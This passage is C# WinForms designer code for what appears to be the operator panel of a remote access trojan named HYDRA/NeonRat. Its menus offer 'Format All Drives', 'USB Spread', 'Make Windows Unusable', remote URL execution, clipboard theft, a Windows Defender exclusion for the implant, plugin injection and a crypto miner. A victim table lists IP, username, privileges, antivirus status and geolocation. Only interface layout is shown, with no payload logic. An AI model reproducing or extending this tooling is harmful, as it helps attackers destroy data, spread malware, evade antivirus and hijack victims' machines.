			this.getLogsLinkToolStripMenuItem.Text = "Get Logs Link";
			this.getLogsLinkToolStripMenuItem.Click += new System.EventHandler(getLogsLinkToolStripMenuItem_Click);
			this.activateSTPluginToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.activateSTPluginToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.activateSTPluginToolStripMenuItem.Name = "activateSTPluginToolStripMenuItem";
			this.activateSTPluginToolStripMenuItem.Size = new System.Drawing.Size(209, 22);
			this.activateSTPluginToolStripMenuItem.Text = "Inject Plugin";
			this.activateSTPluginToolStripMenuItem.Click += new System.EventHandler(activateSTPluginToolStripMenuItem_Click);
			this.remoteSystemManagementToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.executionPolicyAdminToolStripMenuItem, this.formatAllDrivesToolStripMenuItem, this.netFrameworksAdminToolStripMenuItem, this.uSBSpreadToolStripMenuItem, this.killerRegwindowsUnusableToolStripMenuItem, this.sendEmailToolStripMenuItem, this.remoteURLExecutionToolStripMenuItem, this.getTheClipboardToolStripMenuItem, this.addNeonRatExcludeForWDToolStripMenuItem });
			this.remoteSystemManagementToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteSystemManagementToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("remoteSystemManagementToolStripMenuItem.Image");
			this.remoteSystemManagementToolStripMenuItem.Name = "remoteSystemManagementToolStripMenuItem";
			this.remoteSystemManagementToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.remoteSystemManagementToolStripMenuItem.Text = "Remote Management";
			this.remoteSystemManagementToolStripMenuItem.Visible = false;
			this.executionPolicyAdminToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.executionPolicyAdminToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.unrestrictedToolStripMenuItem, this.remoteSignedToolStripMenuItem });
			this.executionPolicyAdminToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.executionPolicyAdminToolStripMenuItem.Name = "executionPolicyAdminToolStripMenuItem";
			this.executionPolicyAdminToolStripMenuItem.Size = new System.Drawing.Size(245, 22);
			this.executionPolicyAdminToolStripMenuItem.Text = "Execution Policy(Admin)";
			this.unrestrictedToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.unrestrictedToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.unrestrictedToolStripMenuItem.Name = "unrestrictedToolStripMenuItem";
			this.unrestrictedToolStripMenuItem.Size = new System.Drawing.Size(170, 22);
			this.unrestrictedToolStripMenuItem.Text = "Unrestricted";
			this.unrestrictedToolStripMenuItem.Click += new System.EventHandler(unrestrictedToolStripMenuItem_Click);
			this.remoteSignedToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteSignedToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteSignedToolStripMenuItem.Name = "remoteSignedToolStripMenuItem";
			this.remoteSignedToolStripMenuItem.Size = new System.Drawing.Size(170, 22);
			this.remoteSignedToolStripMenuItem.Text = "RemoteSigned";
			this.remoteSignedToolStripMenuItem.Click += new System.EventHandler(remoteSignedToolStripMenuItem_Click);
			this.formatAllDrivesToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.formatAllDrivesToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.formatAllDrivesToolStripMenuItem.Name = "formatAllDrivesToolStripMenuItem";
			this.formatAllDrivesToolStripMenuItem.Size = new System.Drawing.Size(245, 22);
			this.formatAllDrivesToolStripMenuItem.Text = "Format All Drives";
			this.formatAllDrivesToolStripMenuItem.Click += new System.EventHandler(formatAllDrivesToolStripMenuItem_Click);
			this.netFrameworksAdminToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.netFrameworksAdminToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.netFrameworksAdminToolStripMenuItem.Name = "netFrameworksAdminToolStripMenuItem";
			this.netFrameworksAdminToolStripMenuItem.Size = new System.Drawing.Size(245, 22);
			this.netFrameworksAdminToolStripMenuItem.Text = "Net Frameworks(Admin)";
			this.netFrameworksAdminToolStripMenuItem.Click += new System.EventHandler(netFrameworksAdminToolStripMenuItem_Click);
			this.uSBSpreadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uSBSpreadToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.uSBSpreadToolStripMenuItem.Name = "uSBSpreadToolStripMenuItem";
			this.uSBSpreadToolStripMenuItem.Size = new System.Drawing.Size(245, 22);
			this.uSBSpreadToolStripMenuItem.Text = "USB Spread";
			this.uSBSpreadToolStripMenuItem.Click += new System.EventHandler(uSBSpreadToolStripMenuItem_Click);
			this.killerRegwindowsUnusableToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.killerRegwindowsUnusableToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.killerRegwindowsUnusableToolStripMenuItem.Name = "killerRegwindowsUnusableToolStripMenuItem";
			this.killerRegwindowsUnusableToolStripMenuItem.Size = new System.Drawing.Size(245, 22);
			this.killerRegwindowsUnusableToolStripMenuItem.Text = "Make Windows Unusable";
			this.killerRegwindowsUnusableToolStripMenuItem.Click += new System.EventHandler(killerRegwindowsUnusableToolStripMenuItem_Click);
			this.sendEmailToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.sendEmailToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.sendEmailToolStripMenuItem.Name = "sendEmailToolStripMenuItem";
			this.sendEmailToolStripMenuItem.Size = new System.Drawing.Size(245, 22);
			this.sendEmailToolStripMenuItem.Text = "Send Email";
			this.sendEmailToolStripMenuItem.Visible = false;
			this.sendEmailToolStripMenuItem.Click += new System.EventHandler(sendEmailToolStripMenuItem_Click);
			this.remoteURLExecutionToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.remoteURLExecutionToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.remoteURLExecutionToolStripMenuItem.Name = "remoteURLExecutionToolStripMenuItem";
			this.remoteURLExecutionToolStripMenuItem.Size = new System.Drawing.Size(245, 22);
			this.remoteURLExecutionToolStripMenuItem.Text = "Remote URL execution";
			this.remoteURLExecutionToolStripMenuItem.Click += new System.EventHandler(remoteURLExecutionToolStripMenuItem_Click);
			this.getTheClipboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.getTheClipboardToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.getTheClipboardToolStripMenuItem.Name = "getTheClipboardToolStripMenuItem";
			this.getTheClipboardToolStripMenuItem.Size = new System.Drawing.Size(245, 22);
			this.getTheClipboardToolStripMenuItem.Text = "Get the clipboard";
			this.getTheClipboardToolStripMenuItem.Visible = false;
			this.getTheClipboardToolStripMenuItem.Click += new System.EventHandler(getTheClipboardToolStripMenuItem_Click);
			this.addNeonRatExcludeForWDToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.addNeonRatExcludeForWDToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.addNeonRatExcludeForWDToolStripMenuItem.Name = "addNeonRatExcludeForWDToolStripMenuItem";
			this.addNeonRatExcludeForWDToolStripMenuItem.Size = new System.Drawing.Size(245, 22);
			this.addNeonRatExcludeForWDToolStripMenuItem.Text = "Add Hydra Exclude for WD";
			this.addNeonRatExcludeForWDToolStripMenuItem.Click += new System.EventHandler(addNeonRatExcludeForWDToolStripMenuItem_Click);
			this.otherFunctionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.adminPermisionsToolStripMenuItem, this.uploadPluginToolStripMenuItem10 });
			this.otherFunctionsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.otherFunctionsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("otherFunctionsToolStripMenuItem.Image");
			this.otherFunctionsToolStripMenuItem.Name = "otherFunctionsToolStripMenuItem";
			this.otherFunctionsToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.otherFunctionsToolStripMenuItem.Text = "Other Functions";
			this.otherFunctionsToolStripMenuItem.Visible = false;
			this.adminPermisionsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.adminPermisionsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.adminPermisionsToolStripMenuItem.Name = "adminPermisionsToolStripMenuItem";
			this.adminPermisionsToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
			this.adminPermisionsToolStripMenuItem.Text = "Admin Permisions";
			this.adminPermisionsToolStripMenuItem.Visible = false;
			this.uploadPluginToolStripMenuItem10.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.uploadPluginToolStripMenuItem10.ForeColor = System.Drawing.Color.White;
			this.uploadPluginToolStripMenuItem10.Name = "uploadPluginToolStripMenuItem10";
			this.uploadPluginToolStripMenuItem10.Size = new System.Drawing.Size(188, 22);
			this.uploadPluginToolStripMenuItem10.Text = "Inject Plugin";
			this.minerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.compileMinerToolStripMenuItem, this.startToolStripMenuItem1, this.activateMinerPluginToolStripMenuItem });
			this.minerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.minerToolStripMenuItem.Name = "minerToolStripMenuItem";
			this.minerToolStripMenuItem.Size = new System.Drawing.Size(232, 26);
			this.minerToolStripMenuItem.Text = "Miner";
			this.minerToolStripMenuItem.Visible = false;
			this.compileMinerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.compileMinerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.compileMinerToolStripMenuItem.Name = "compileMinerToolStripMenuItem";
			this.compileMinerToolStripMenuItem.Size = new System.Drawing.Size(212, 22);
			this.compileMinerToolStripMenuItem.Text = "Compile Miner";
			this.startToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.startToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			this.startToolStripMenuItem1.Name = "startToolStripMenuItem1";
			this.startToolStripMenuItem1.Size = new System.Drawing.Size(212, 22);
			this.startToolStripMenuItem1.Text = "Start Mining";
			this.startToolStripMenuItem1.Click += new System.EventHandler(startToolStripMenuItem1_Click);
			this.activateMinerPluginToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.activateMinerPluginToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.activateMinerPluginToolStripMenuItem.Name = "activateMinerPluginToolStripMenuItem";
			this.activateMinerPluginToolStripMenuItem.Size = new System.Drawing.Size(212, 22);
			this.activateMinerPluginToolStripMenuItem.Text = "Activate Miner Plugin";
			this.activateMinerPluginToolStripMenuItem.Visible = false;
			this.activateMinerPluginToolStripMenuItem.Click += new System.EventHandler(activateMinerPluginToolStripMenuItem_Click);
			this.listView2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.listView2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.listView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.colDateTime, this.colEven });
			this.listView2.ContextMenuStrip = this.guna2ContextMenuStrip2;
			this.bunifuTransition2.SetDecoration(this.listView2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.listView2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.listView2.Font = new System.Drawing.Font("Century Gothic", 9f);
			this.listView2.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.listView2.FullRowSelect = true;
			this.listView2.HideSelection = false;
			this.listView2.LabelEdit = true;
			this.listView2.Location = new System.Drawing.Point(0, 505);
			this.listView2.Name = "listView2";
			this.listView2.OwnerDraw = true;
			this.listView2.ShowItemToolTips = true;
			this.listView2.Size = new System.Drawing.Size(1314, 95);
			this.listView2.SmallImageList = this.imageList2;
			this.listView2.TabIndex = 2;
			this.bunifuToolTip1.SetToolTip(this.listView2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.listView2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.listView2, "");
			this.listView2.UseCompatibleStateImageBehavior = false;
			this.listView2.View = System.Windows.Forms.View.Details;
			this.listView2.Visible = false;
			this.listView2.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(ListView2_DrawColumnHeader);
			this.listView2.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(ListView2_DrawItem);
			this.listView2.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(ListView2_DrawSubItem);
			this.colDateTime.Text = "Date/Time";
			this.colDateTime.Width = 220;
			this.colEven.Text = "Event";
			this.colEven.Width = 984;
			this.guna2ContextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuTransition2.SetDecoration(this.guna2ContextMenuStrip2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.guna2ContextMenuStrip2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.guna2ContextMenuStrip2.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.guna2ContextMenuStrip2.ImageScalingSize = new System.Drawing.Size(19, 19);
			this.guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.toolStripMenuItem7 });
			this.guna2ContextMenuStrip2.Name = "guna2ContextMenuStrip1";
			this.guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.Honeydew;
			this.guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
			this.guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
			this.guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			this.guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.Black;
			this.guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			this.guna2ContextMenuStrip2.Size = new System.Drawing.Size(174, 30);
			this.bunifuToolTip1.SetToolTip(this.guna2ContextMenuStrip2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2ContextMenuStrip2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2ContextMenuStrip2, "");
			this.toolStripMenuItem7.ForeColor = System.Drawing.Color.White;
			this.toolStripMenuItem7.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem7.Image");
			this.toolStripMenuItem7.Name = "toolStripMenuItem7";
			this.toolStripMenuItem7.Size = new System.Drawing.Size(173, 26);
			this.toolStripMenuItem7.Text = "Copy Selected";
			this.toolStripMenuItem7.Click += new System.EventHandler(toolStripMenuItem7_Click);
			this.imageList2.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList2.ImageStream");
			this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList2.Images.SetKeyName(0, "clipboard_50px.png");
			this.imageList2.Images.SetKeyName(1, "connected_50px.png");
			this.imageList2.Images.SetKeyName(2, "disconnected_50px.png");
			this.imageList2.Images.SetKeyName(3, "wired_network_connection_50px.png");
			this.imageList2.Images.SetKeyName(4, "no_network_50px.png");
			this.imageList2.Images.SetKeyName(5, "edit_user_50px.png");
			((System.Windows.Forms.Control)(object)this.lblOnline).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.lblOnline).BackColor = System.Drawing.Color.Transparent;
			this.bunifuTransition2.SetDecoration((System.Windows.Forms.Control)(object)this.lblOnline, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration((System.Windows.Forms.Control)(object)this.lblOnline, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.lblOnline.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.lblOnline.ForeColor = System.Drawing.Color.WhiteSmoke;
			((System.Windows.Forms.Control)(object)this.lblOnline).Location = new System.Drawing.Point(631, 14);
			((System.Windows.Forms.Control)(object)this.lblOnline).Name = "lblOnline";
			((System.Windows.Forms.Control)(object)this.lblOnline).Size = new System.Drawing.Size(156, 23);
			((System.Windows.Forms.Control)(object)this.lblOnline).TabIndex = 7;
			((System.Windows.Forms.Control)(object)this.lblOnline).Text = "No User Connected";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.lblOnline, "Connected Clients");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.lblOnline, (System.Drawing.Image)resources.GetObject("lblOnline.ToolTipIcon"));
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.lblOnline, "NeonRat");
			this.listView1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[9] { this.columnHeader1, this.columnHeader2, this.columnHeader3, this.columnHeader4, this.columnHeader5, this.columnHeader6, this.columnHeader7, this.columnHeader8, this.columnHeader9 });
			this.listView1.ContextMenuStrip = this.guna2ContextMenuStrip1;
			this.bunifuTransition2.SetDecoration(this.listView1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.listView1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.listView1.Dock = System.Windows.Forms.DockStyle.Top;
			this.listView1.Font = new System.Drawing.Font("Century Gothic", 9f);
			this.listView1.ForeColor = System.Drawing.Color.AliceBlue;
			this.listView1.FullRowSelect = true;
			this.listView1.HideSelection = false;
			this.listView1.HoverSelection = true;
			this.listView1.Location = new System.Drawing.Point(0, 0);
			this.listView1.Name = "listView1";
			this.listView1.OwnerDraw = true;
			this.listView1.Size = new System.Drawing.Size(1317, 491);
			this.listView1.SmallImageList = this.imageList1;
			this.listView1.TabIndex = 1;
			this.bunifuToolTip1.SetToolTip(this.listView1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.listView1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.listView1, "");
			this.listView1.UseCompatibleStateImageBehavior = false;
			this.listView1.View = System.Windows.Forms.View.Details;
			this.listView1.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(ListView1_DrawColumnHeader);
			this.listView1.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(ListView1_DrawItem);
			this.listView1.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(ListView1_DrawSubItem);
			this.columnHeader1.Text = "IP Address";
			this.columnHeader1.Width = 123;
			this.columnHeader2.Text = "Username";
			this.columnHeader2.Width = 122;
			this.columnHeader3.Text = "Operating System";
			this.columnHeader3.Width = 165;
			this.columnHeader4.Text = "Startup Time";
			this.columnHeader4.Width = 164;
			this.columnHeader5.Text = "Install Time";
			this.columnHeader5.Width = 160;
			this.columnHeader6.Text = "Privileges";
			this.columnHeader6.Width = 129;
			this.columnHeader7.Text = "WindowsAV";
			this.columnHeader7.Width = 150;
			this.columnHeader8.Text = ".Net Framework";
			this.columnHeader8.Width = 147;
			this.columnHeader9.Text = "Geolocation";
			this.columnHeader9.Width = 135;
			this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
			this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList1.Images.SetKeyName(0, "web_address_50px.png");
			this.imageList1.Images.SetKeyName(1, "user_50px.png");
			this.imageList1.Images.SetKeyName(2, "windows8_50px.png");
			this.imageList1.Images.SetKeyName(3, "time_50px.png");
			this.imageList1.Images.SetKeyName(4, "time_sed50px.png");
			this.imageList1.Images.SetKeyName(5, "mericrosoft_admin_50px.png");
			this.imageList1.Images.SetKeyName(6, "firewall_50px.png");
			this.imageList1.Images.SetKeyName(7, "dna_helix_50px.png");
			this.imageList1.Images.SetKeyName(8, "location_50px.png");
			this.imageList1.Images.SetKeyName(9, "about_48px.png");
			this.notifyIcon.BalloonTipText = "HYDRA";
			this.notifyIcon.BalloonTipTitle = "HYDRA | Client";
			this.notifyIcon.Icon = (System.Drawing.Icon)resources.GetObject("notifyIcon.Icon");
			this.notifyIcon.Text = "HYDRA";
			this.notifyIcon.Visible = true;
			this.timer1.Enabled = true;
			this.timer1.Interval = 1000;
			this.pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.pictureBox1.Cursor = System.Windows.Forms.Cursors.Hand;
			this.bunifuTransition1.SetDecoration(this.pictureBox1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.pictureBox1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new System.Drawing.Point(1302, 44);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new System.Drawing.Size(24, 24);
			this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox1.TabIndex = 57;
			this.pictureBox1.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.pictureBox1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.pictureBox1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.pictureBox1, "");
			this.pictureBox1.Visible = false;
			this.pictureBox1.Click += new System.EventHandler(pictureBox1_Click);
			this.iconrestaurar.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.iconrestaurar.Cursor = System.Windows.Forms.Cursors.Hand;
			this.bunifuTransition1.SetDecoration(this.iconrestaurar, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.iconrestaurar, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.iconrestaurar.Image = (System.Drawing.Image)resources.GetObject("iconrestaurar.Image");
			this.iconrestaurar.Location = new System.Drawing.Point(1328, 44);
			this.iconrestaurar.Name = "iconrestaurar";
			this.iconrestaurar.Size = new System.Drawing.Size(24, 24);
			this.iconrestaurar.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.iconrestaurar.TabIndex = 56;
			this.iconrestaurar.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.iconrestaurar, "");
			this.bunifuToolTip1.SetToolTipIcon(this.iconrestaurar, null);
			this.bunifuToolTip1.SetToolTipTitle(this.iconrestaurar, "");
			this.iconrestaurar.Visible = false;
			this.iconrestaurar.Click += new System.EventHandler(iconrestaurar_Click);
			this.iconmaximizar.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.iconmaximizar.Cursor = System.Windows.Forms.Cursors.Hand;
			this.bunifuTransition1.SetDecoration(this.iconmaximizar, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.iconmaximizar, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.iconmaximizar.Image = (System.Drawing.Image)resources.GetObject("iconmaximizar.Image");
			this.iconmaximizar.Location = new System.Drawing.Point(1358, 44);
			this.iconmaximizar.Name = "iconmaximizar";
			this.iconmaximizar.Size = new System.Drawing.Size(24, 24);
			this.iconmaximizar.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.iconmaximizar.TabIndex = 55;
			this.iconmaximizar.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.iconmaximizar, "");
			this.bunifuToolTip1.SetToolTipIcon(this.iconmaximizar, null);
			this.bunifuToolTip1.SetToolTipTitle(this.iconmaximizar, "");
			this.iconmaximizar.Visible = false;
			this.iconmaximizar.Click += new System.EventHandler(iconmaximizar_Click);
			this.pictureBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.pictureBox4.Cursor = System.Windows.Forms.Cursors.Hand;
			this.bunifuTransition1.SetDecoration(this.pictureBox4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition2.SetDecoration(this.pictureBox4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.pictureBox4.Image = (System.Drawing.Image)resources.GetObject("pictureBox4.Image");
			this.pictureBox4.Location = new System.Drawing.Point(1384, 44);
			this.pictureBox4.Name = "pictureBox4";
			this.pictureBox4.Size = new System.Drawing.Size(24, 24);
			this.pictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox4.TabIndex = 54;
			this.pictureBox4.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.pictureBox4, "");
			this.bunifuToolTip1.SetToolTipIcon(this.pictureBox4, null);
			this.bunifuToolTip1.SetToolTipTitle(this.pictureBox4, "");
			this.pictureBox4.Visible = false;
			this.pictureBox4.Click += new System.EventHandler(pictureBox4_Click);
			this.bunifuTransition2.SetDecoration(this.guna2PictureBox1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.guna2PictureBox1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			this.guna2PictureBox1.ImageRotate = 0f;
			this.guna2PictureBox1.Location = new System.Drawing.Point(12, 14);
			this.guna2PictureBox1.Name = "guna2PictureBox1";
			this.guna2PictureBox1.ShadowDecoration.Parent = this.guna2PictureBox1;
			this.guna2PictureBox1.Size = new System.Drawing.Size(128, 58);
			this.guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.guna2PictureBox1.TabIndex = 71;
			this.guna2PictureBox1.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.guna2PictureBox1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2PictureBox1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2PictureBox1, "");
			this.bunifuSeparator8.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator8.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator8.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator8.BackgroundImage");
			this.bunifuSeparator8.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator8.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator8, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator8, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator8.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator8.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator8.LineThickness = 1;
			this.bunifuSeparator8.Location = new System.Drawing.Point(0, -6);
			this.bunifuSeparator8.Name = "bunifuSeparator8";
			this.bunifuSeparator8.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator8.Size = new System.Drawing.Size(1419, 12);
			this.bunifuSeparator8.TabIndex = 73;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator8, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator8, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator8, "");
			this.bunifuSeparator9.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator9.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator9.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator9.BackgroundImage");
			this.bunifuSeparator9.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator9.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator9, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator9, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator9.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator9.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator9.LineThickness = 1;
			this.bunifuSeparator9.Location = new System.Drawing.Point(1411, 1);
			this.bunifuSeparator9.Name = "bunifuSeparator9";
			this.bunifuSeparator9.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
